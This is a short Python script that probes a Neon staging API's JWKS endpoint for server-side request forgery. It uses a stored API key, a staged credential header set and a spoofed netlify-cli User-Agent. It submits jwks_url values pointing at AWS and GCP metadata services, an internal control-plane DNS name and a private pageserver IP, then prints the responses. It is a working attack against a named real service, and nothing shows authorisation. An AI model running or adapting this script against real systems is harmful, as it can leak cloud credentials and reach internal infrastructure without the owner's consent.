# -*- coding: utf-8 -*-
"""JWKS / auth 集成现状 + jwks_url SSRF 向量探测(只观察响应差异)"""
import http.client, ssl, json, sys
ctx = ssl.create_default_context()
ORG = 'org-flat-dawn-91601224'
P = 'orange-sun-90493739'
B = 'br-wandering-field-w2ob6mpn'
key = json.load(open(r'D:\scan\neon_report\_apikey.json'))['key']
from _neon_creds_stage import API_HOST, API_BASE, HEADERS_TEST

def req(method, path, body=None):
    conn = http.client.HTTPSConnection(API_HOST, context=ctx, timeout=30)
    h = {'User-Agent': 'netlify-cli/17.0.0', 'Accept': 'application/json', 'Content-Type': 'application/json',
         'Authorization': 'Bearer ' + key}
    h.update(HEADERS_TEST)
    conn.request(method, API_BASE + path, body=json.dumps(body).encode() if body is not None else None, headers=h)
    r = conn.getresponse(); raw = r.read()
    st = r.status; conn.close()
    return st, raw

def show(tag, st, raw, cut=500):
    print('\n== %s -> %d' % (tag, st))
    print(raw[:cut].decode(errors='replace'))

# 1) 现状
show('GET /jwks', *req('GET', '/projects/%s/jwks' % P))
show('GET auth integrations', *req('GET', '/projects/%s/auth/integrations' % P))
show('GET data-api(看当前 auth_provider 形态)', *req('GET', '/projects/%s/branches/%s/data-api/neondb' % (P, B)), 800)

# 2) jwks_url SSRF 向量:metadata / 内部 DNS / 公网正常地址(对照)
import time
vecs = [
    ('aws metadata', 'http://169.254.169.254/latest/meta-data/'),
    ('gcp metadata', 'http://metadata.google.internal/computeMetadata/v1/'),
    ('internal cplane', 'http://neon-control-plane-api.neon-control-plane.svc.cluster.local:9096/'),
    ('internal pageserver', 'http://10.6.11.84:6400/'),
    ('invalid-tld', 'http://this-host-does-not-exist-zzz.invalid/'),
    ('public ok', 'https://console-stage.neon.build/'),
]
for name, url in vecs:
    st, raw = req('POST', '/projects/%s/jwks' % P,
                  {'jwks_url': url, 'provider_name': 'secprobe-%s' % name.split()[0]})
    show('jwks_url=[%s] %s' % (name, url[:60]), st, raw, 350)
    time.sleep(1.2)
